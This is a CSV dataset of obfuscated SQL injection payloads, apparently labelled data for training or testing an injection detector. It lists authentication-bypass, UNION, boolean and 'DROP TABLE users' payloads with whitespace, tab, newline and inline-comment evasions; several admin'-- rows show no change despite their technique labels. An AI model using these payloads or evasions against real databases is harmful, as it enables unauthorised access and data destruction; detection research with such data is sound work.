variant_id,original_payload,obfuscated_payload,technique,intensity,Label,obfuscation_level
WS_00000,' OR 1=1--,' OR   1=1--,excessive_spaces,low,1,simple
WS_00001,' OR 1=1--,' OR      1=1--,excessive_spaces,medium,1,moderate
WS_00002,' OR 1=1--,' OR           1=1--,excessive_spaces,high,1,aggressive
WS_00003,' OR 1=1--,'\tOR\t1=1--,tab_injection,low,1,simple
WS_00004,' OR 1=1--,'\t\t\tOR\t\t\t1=1--,tab_injection,medium,1,moderate
WS_00005,' OR 1=1--,'\t\t\t\t\tOR\t\t\t\t\t1=1--,tab_injection,high,1,aggressive
WS_00006,' OR 1=1--,"' O
R 1=1--",newline_split,low,1,simple
WS_00007,' OR 1=1--,"' O

R 1=1--",newline_split,medium,1,moderate
WS_00008,' OR 1=1--,"' O


R 1=1--",newline_split,high,1,aggressive
WS_00009,' OR 1=1--,"' 
OR 1=1--",mixed_whitespace,medium,1,moderate
WS_00010,' OR 1=1--,' O/**/R 1=1--,inline_comment_middle,medium,1,moderate
WS_00011,' OR 1=1--,' O/**/R 1=1--,inline_comment_after_each_char,high,1,aggressive
WS_00012,' OR 1=1--,' O/**/R 1=1--,inline_comment_random,medium,1,moderate
WS_00013,' OR 1=1--,' O/* */R 1=1--,multiline_comment,medium,1,moderate
WS_00014,' OR 1=1--,' O/*comment*/R 1=1--,multiline_comment,medium,1,moderate
WS_00015,' OR 1=1--,' O/*evil*/R 1=1--,multiline_comment,medium,1,moderate
WS_00016,' OR 1=1--,' OR 1=1-- extra comment,dash_comment,low,1,simple
WS_00017,' OR 1=1--,' OR 1=1--# comment,hash_comment,low,1,simple
WS_00018,' UNION SELECT NULL--,' UNION   SELECT   NULL--,excessive_spaces,low,1,simple
WS_00019,' UNION SELECT NULL--,' UNION      SELECT      NULL--,excessive_spaces,medium,1,moderate
WS_00020,' UNION SELECT NULL--,' UNION           SELECT           NULL--,excessive_spaces,high,1,aggressive
WS_00021,' UNION SELECT NULL--,'\tUNION\tSELECT\tNULL--,tab_injection,low,1,simple
WS_00022,' UNION SELECT NULL--,'\t\t\tUNION\t\t\tSELECT\t\t\tNULL--,tab_injection,medium,1,moderate
WS_00023,' UNION SELECT NULL--,'\t\t\t\t\tUNION\t\t\t\t\tSELECT\t\t\t\t\tNULL--,tab_injection,high,1,aggressive
WS_00024,' UNION SELECT NULL--,"' UNION SEL
ECT NULL--",newline_split,low,1,simple
WS_00025,' UNION SELECT NULL--,"' UNION SEL

ECT NULL--",newline_split,medium,1,moderate
WS_00026,' UNION SELECT NULL--,"' UNION SEL


ECT NULL--",newline_split,high,1,aggressive
WS_00027,' UNION SELECT NULL--,"'   	UNION 
SELECT NULL--",mixed_whitespace,medium,1,moderate
WS_00028,' UNION SELECT NULL--,' UNION SEL/**/ECT NULL--,inline_comment_middle,medium,1,moderate
WS_00029,' UNION SELECT NULL--,' UNION S/**/E/**/L/**/E/**/C/**/T NULL--,inline_comment_after_each_char,high,1,aggressive
WS_00030,' UNION SELECT NULL--,' UNION S/**/ELECT NULL--,inline_comment_random,medium,1,moderate
WS_00031,' UNION SELECT NULL--,' UNION SEL/* */ECT NULL--,multiline_comment,medium,1,moderate
WS_00032,' UNION SELECT NULL--,' UNION SEL/*comment*/ECT NULL--,multiline_comment,medium,1,moderate
WS_00033,' UNION SELECT NULL--,' UNION SEL/*evil*/ECT NULL--,multiline_comment,medium,1,moderate
WS_00034,' UNION SELECT NULL--,' UNION SELECT NULL-- extra comment,dash_comment,low,1,simple
WS_00035,' UNION SELECT NULL--,' UNION SELECT NULL--# comment,hash_comment,low,1,simple
WS_00036,admin'--,admin'--,excessive_spaces,low,1,simple
WS_00037,admin'--,admin'--,excessive_spaces,medium,1,moderate
WS_00038,admin'--,admin'--,excessive_spaces,high,1,aggressive
WS_00039,admin'--,admin'--,tab_injection,low,1,simple
WS_00040,admin'--,admin'--,tab_injection,medium,1,moderate
WS_00041,admin'--,admin'--,tab_injection,high,1,aggressive
WS_00042,admin'--,admin'--,newline_split,low,1,simple
WS_00043,admin'--,admin'--,newline_split,medium,1,moderate
WS_00044,admin'--,admin'--,newline_split,high,1,aggressive
WS_00045,admin'--,admin'--,mixed_whitespace,medium,1,moderate
WS_00046,admin'--,admin'--,inline_comment_middle,medium,1,moderate
WS_00047,admin'--,admin'--,inline_comment_after_each_char,high,1,aggressive
WS_00048,admin'--,admin'--,inline_comment_random,medium,1,moderate
WS_00049,admin'--,admin'--,multiline_comment,medium,1,moderate
WS_00050,admin'--,admin'--,multiline_comment,medium,1,moderate
WS_00051,admin'--,admin'--,multiline_comment,medium,1,moderate
WS_00052,admin'--,admin'-- extra comment,dash_comment,low,1,simple
WS_00053,admin'--,admin'--# comment,hash_comment,low,1,simple
WS_00054,1' AND '1'='1,1' AND   '1'='1,excessive_spaces,low,1,simple
WS_00055,1' AND '1'='1,1' AND      '1'='1,excessive_spaces,medium,1,moderate
WS_00056,1' AND '1'='1,1' AND           '1'='1,excessive_spaces,high,1,aggressive
WS_00057,1' AND '1'='1,1'\tAND\t'1'='1,tab_injection,low,1,simple
WS_00058,1' AND '1'='1,1'\t\t\tAND\t\t\t'1'='1,tab_injection,medium,1,moderate
WS_00059,1' AND '1'='1,1'\t\t\t\t\tAND\t\t\t\t\t'1'='1,tab_injection,high,1,aggressive
WS_00060,1' AND '1'='1,"1' A
ND '1'='1",newline_split,low,1,simple
WS_00061,1' AND '1'='1,"1' A

ND '1'='1",newline_split,medium,1,moderate
WS_00062,1' AND '1'='1,"1' A


ND '1'='1",newline_split,high,1,aggressive
WS_00063,1' AND '1'='1,1' 	AND '1'='1,mixed_whitespace,medium,1,moderate
WS_00064,1' AND '1'='1,1' A/**/ND '1'='1,inline_comment_middle,medium,1,moderate
WS_00065,1' AND '1'='1,1' A/**/N/**/D '1'='1,inline_comment_after_each_char,high,1,aggressive
WS_00066,1' AND '1'='1,1' A/**/ND '1'='1,inline_comment_random,medium,1,moderate
WS_00067,1' AND '1'='1,1' A/* */ND '1'='1,multiline_comment,medium,1,moderate
WS_00068,1' AND '1'='1,1' A/*comment*/ND '1'='1,multiline_comment,medium,1,moderate
WS_00069,1' AND '1'='1,1' A/*evil*/ND '1'='1,multiline_comment,medium,1,moderate
WS_00070,1' AND '1'='1,1' AND '1'='1-- comment,dash_comment,low,1,simple
WS_00071,1' AND '1'='1,1' AND '1'='1# comment,hash_comment,low,1,simple
WS_00072,'; DROP TABLE users--,'; DROP   TABLE   users--,excessive_spaces,low,1,simple
WS_00073,'; DROP TABLE users--,'; DROP      TABLE      users--,excessive_spaces,medium,1,moderate
WS_00074,'; DROP TABLE users--,'; DROP           TABLE           users--,excessive_spaces,high,1,aggressive
WS_00075,'; DROP TABLE users--,';\tDROP\tTABLE\tusers--,tab_injection,low,1,simple
WS_00076,'; DROP TABLE users--,';\t\t\tDROP\t\t\tTABLE\t\t\tusers--,tab_injection,medium,1,moderate
WS_00077,'; DROP TABLE users--,';\t\t\t\t\tDROP\t\t\t\t\tTABLE\t\t\t\t\tusers--,tab_injection,high,1,aggressive
WS_00078,'; DROP TABLE users--,"'; DR
OP TABLE users--",newline_split,low,1,simple
WS_00079,'; DROP TABLE users--,"'; DR

OP TABLE users--",newline_split,medium,1,moderate
WS_00080,'; DROP TABLE users--,"'; DR


OP TABLE users--",newline_split,high,1,aggressive
WS_00081,'; DROP TABLE users--,';  DROP  TABLE users--,mixed_whitespace,medium,1,moderate
WS_00082,'; DROP TABLE users--,'; DR/**/OP TABLE users--,inline_comment_middle,medium,1,moderate
WS_00083,'; DROP TABLE users--,'; D/**/R/**/O/**/P TABLE users--,inline_comment_after_each_char,high,1,aggressive
